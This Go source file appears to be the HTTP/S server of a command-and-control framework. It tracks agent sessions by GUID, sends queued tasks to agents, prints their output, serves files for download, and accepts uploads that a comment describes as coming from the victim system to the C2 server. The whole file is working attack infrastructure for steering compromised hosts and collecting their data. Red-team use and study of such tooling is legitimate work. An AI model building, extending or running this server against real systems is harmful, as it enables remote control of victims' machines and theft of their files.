package httpserver

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/fatih/color"
	"github.com/gorilla/mux"
)

// SessionList is a global variable used to track agent sessions
var SessionList []string

// Session is used to uniquely identify an agent session
var Session struct {
	GUID   string
	IPaddr string
	//PID       int
	//ParentPID int
	FirstSeen string
	LastSeen  string
}

// Start executes the HTTP/S server
func Start(enableSSL bool, lhost, certFile, keyFile string) {
	r := mux.NewRouter()

	// setup routes to handle task requests and output submissions
	r.HandleFunc("/task.html", handleTask).Methods("POST")
	r.HandleFunc("/output.html", handleOutput).Methods("POST")
	r.HandleFunc("/upload.html", handleUpload).Methods("POST")
	http.Handle("/", r)

	// setup routes to handle file downloads
	var dir string
	flag.StringVar(&dir, "dir", "./download/", "The directory to serve files from")
	r.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir(dir))))

	srv := &http.Server{
		Addr:         lhost,
		Handler:      r,
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}
	if enableSSL {
		needToGenCert := checkCert(certFile, keyFile)
		if needToGenCert {
			log.Println("Generating SSL certifacte and private key files")
			certFile, keyFile = generateSSLcert()
		}

		log.Println("Listening on https://" + lhost)
		log.Fatalln(srv.ListenAndServeTLS(certFile, keyFile))
		return
	}
	log.Println("Listening on http://" + lhost)
	log.Fatalln(srv.ListenAndServe())
}

func generateSSLcert() (string, string) {
	cmd := exec.Command("sh", "-c", "openssl req -new -x509 -keyout ./cert.key -out ./cert.pem -days 365 -nodes -subj \"/C=US\"")
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
	return "cert.pem", "cert.key"
}

func checkCert(certFile, keyFile string) bool {
	if (certFile == "") && (keyFile == "") {
		log.Println("Blank options: -cert, -key")
		return true
	}
	return false
}

// handleTask responds to agent task requests
func handleTask(w http.ResponseWriter, r *http.Request) {
	// read agent GUID from HTTP POST data
	guidBytes, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
	}
	guid := string(guidBytes)

	// check GUID to see if agent is new; if so, register agent
	isNewSession := checkNewSession(guid)
	if isNewSession == true {
		registerNewSession(guid)
		clientIP, _, _ := net.SplitHostPort(r.RemoteAddr)
		fmt.Println()
		s := "[+] New session received from host: " + clientIP
		log.Println(color.GreenString(s))
	}

	// read current tasks; return if no tasks are present
	task, err := ioutil.ReadFile("tasking.html")
	if err != nil {
		return
	}
	if len(task) == 0 {
		return
	}
	// delete task file so that the tasks are not sent to the agent repeatedly
	os.Remove("tasking.html")

	// send task to agent
	fmt.Fprintf(w, string(task))
	fmt.Println()
	s := "[i] Agent received tasking: " + string(task)
	log.Println(color.CyanString(s))

}

// handleUpload handles uploads from the victim system to the C2 server
func handleUpload(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
	}

	// open file containing file name
	fileName, err := ioutil.ReadFile("dstFile.txt")
	if err != nil {
		log.Println(err)
	}
	// write contents
	err = ioutil.WriteFile(string(fileName), body, 0644)
	if err != nil {
		log.Println(err)
	}
	os.Remove("dstFile.txt")
	log.Println("[+] Download Complete: ", string(fileName))
}

func handleOutput(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
	}
	if len(body) == 0 {
		return
	}
	fmt.Println()
	log.Println(color.CyanString("[+] Task Output:"))
	out := string(body)
	fmt.Println(color.GreenString(out))
}

func checkNewSession(guid string) bool {
	for _, session := range SessionList {
		if guid == session {
			return false
		}
	}
	return true
}

func registerNewSession(guid string) {
	SessionList = append(SessionList, guid)
}
